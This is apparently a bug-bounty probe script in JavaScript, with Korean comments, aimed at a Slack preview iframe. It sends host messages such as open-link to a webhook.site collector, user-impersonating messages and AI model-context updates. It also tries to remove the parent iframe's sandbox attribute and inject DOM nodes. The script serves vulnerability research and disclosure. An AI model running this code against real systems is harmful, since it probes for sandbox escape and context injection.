/*
 * round-2 active probe  (security research / self-test)
 * 목적: raw 프리뷰 내부에서 P()를 통과하는 메시지를 호스트로 보내
 *       "호스트가 실제로 행동하는가"와, MutationObserver 틈(속성/자식)을 측정.
 * 원칙: 데이터 반출 없음(ui/open-link만 '본인 COLLECTOR'로, 옵트인). 화면 출력.
 * 사용: VM + 던져도 되는 Slack 워크스페이스에서만. 결과는 HackerOne 보고용.
 */
(function () {
  "use strict";

  // ===== CONFIG: 본인 값/스위치로 바꾸세요 =====
  var COLLECTOR = "https://webhook.site/162f25bb-fb72-4708-8022-39d06dbc6144"; // 본인이 로그를 볼 수 있는 엔드포인트로 교체
  var ENABLE = {
    openLink:    true,   // ui/open-link -> COLLECTOR (호스트가 링크를 여는지 = 네트워크/로그에 찍힘)
    uiMessage:   false,  // ⚠️ 테스트 DM에 글이 올라올 수 있음. 확인 후 true
    surfaceOpen: true,   // slack/surface-comment/open
    toolsCall:   true,   // tools/call (raw엔 핸들러 없을 수도)
    resources:   true,   // resources/list, resources/read
    modelCtx:    false,  // ⚠️ ui/update-model-context (AI 컨텍스트 주입). 확인 후 true
    sandboxAttr: true,   // 내 iframe sandbox 속성 제거가 먹히는지 (비파괴: 지웠다 복구)
    childAdd:    true     // proxy body에 자식 추가 → 옵저버가 되돌리는지 (대조군)
  };
  // ============================================

  var out = [];
  function log(k, v) { out.push([k, String(v)]); render(); }

  // 들어오는 메시지 전부 기록 (호스트 응답 포착)
  window.addEventListener("message", function (e) {
    var who = e.source === window.parent ? "parent" : (e.source === window.top ? "top" : "other");
    log("<< " + e.origin + " [" + who + "]", JSON.stringify(e.data).slice(0, 400));
  }, false);

  function send(target, label, msg) {
    try { target.postMessage(msg, "*"); log(">> " + label, JSON.stringify(msg).slice(0, 200)); }
    catch (e) { log(">> " + label + " THREW", e.name); }
  }
  var id = 100;
  function rpc(method, params) { return { jsonrpc: "2.0", id: ++id, method: method, params: params || {} }; }

  // ── A. ui/open-link -> 내 collector (호스트가 여나) ──
  if (ENABLE.openLink) {
    var u = COLLECTOR + "?probe=openlink&ts=" + Date.now();
    send(window.parent, "ui/open-link -> proxy", rpc("ui/open-link", { url: u }));
    log("관찰[A]", "COLLECTOR 로그/네트워크탭에 위 URL 요청이 찍히면 = 호스트가 링크를 엶");
  }

  // ── B. ui/message (테스트 DM에 글 올라오나) ──
  if (ENABLE.uiMessage) {
    send(window.parent, "ui/message -> proxy", rpc("ui/message", { text: "PROBE-" + Date.now() }));
    log("관찰[B]", "테스트 DM에 PROBE-... 가 보이면 = 사용자 명의 전송 가능");
  }

  // ── C. surface-comment/open ──
  if (ENABLE.surfaceOpen) {
    send(window.parent, "surface-comment/open -> proxy",
      { type: "slack/surface-comment/open", commentId: "probe-" + Date.now(), selection: null });
  }

  // ── D. MCP 메서드 (raw엔 핸들러 없을 수도 — 'no handler'인지 확인) ──
  if (ENABLE.toolsCall) send(window.parent, "tools/call -> proxy", rpc("tools/call", { name: "probe", arguments: {} }));
  if (ENABLE.resources) {
    send(window.parent, "resources/list -> proxy", rpc("resources/list", {}));
    send(window.parent, "resources/read -> proxy", rpc("resources/read", { uri: "probe://x" }));
  }
  if (ENABLE.modelCtx) send(window.parent, "ui/update-model-context -> proxy", rpc("ui/update-model-context", { context: "PROBE" }));

  // ── E. 내 iframe sandbox 속성 제거가 먹히나 (비파괴) ──
  if (ENABLE.sandboxAttr) {
    try {
      var ifr = window.parent.document.querySelector("iframe");
      var before = ifr ? ifr.getAttribute("sandbox") : "no-iframe";
      if (ifr) ifr.removeAttribute("sandbox");
      setTimeout(function () {
        var after = ifr ? ifr.getAttribute("sandbox") : "no-iframe";
        log("sandbox attr before", before);
        log("sandbox attr after remove", after === null ? "REMOVED (안 되돌려짐)" : after);
        log("해석[E]", after === null
          ? "속성 제거 성립 → 리로드 시 non-sandbox 문서 가능(단 샌드박스 오리진 유지 + 메인창 ae 가드가 top이동 차단)"
          : "되돌려짐(옵저버/다른 방어가 잡음)");
        if (ifr && before && before !== "no-iframe") ifr.setAttribute("sandbox", before); // 복구
      }, 300);
    } catch (e) { log("sandbox attr", "THROW " + e.name); }
  }

  // ── F. proxy body에 자식 추가 → 옵저버가 되돌리나 (대조군) ──
  if (ENABLE.childAdd) {
    try {
      var node = window.parent.document.createElement("div");
      node.id = "__childadd"; node.textContent = "x";
      window.parent.document.body.appendChild(node);
      setTimeout(function () {
        var still = window.parent.document.getElementById("__childadd");
        log("child-add to proxy body", still ? "남아있음(옵저버 미작동?)" : "제거됨(옵저버가 되돌림 = 자식추가는 막힘)");
      }, 300);
    } catch (e) { log("child-add", "THROW " + e.name); }
  }

  // ── 렌더 ──
  function esc(s) { return s.replace(/[&<>]/g, function (c) { return { "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c]; }); }
  function render() {
    var rows = out.map(function (kv) {
      return "<tr><td style='color:#8ab;padding:2px 10px;vertical-align:top;white-space:nowrap'>" +
        esc(kv[0]) + "</td><td style='padding:2px 10px;word-break:break-all'>" + esc(kv[1]) + "</td></tr>";
    }).join("");
    var el = document.getElementById("__probe2");
    if (!el) {
      el = document.createElement("div");
      el.id = "__probe2";
      el.style.cssText = "position:fixed;inset:0;background:#0b0e14;color:#e6e6e6;overflow:auto;z-index:2147483647;padding:12px;font:12px/1.5 monospace";
      (document.body || document.documentElement).appendChild(el);
    }
    el.innerHTML = "<div style='font-weight:700;margin-bottom:8px'>round-2 active probe</div><table style='border-collapse:collapse'>" + rows + "</table>";
  }
  render();
  setTimeout(render, 2000);
})();
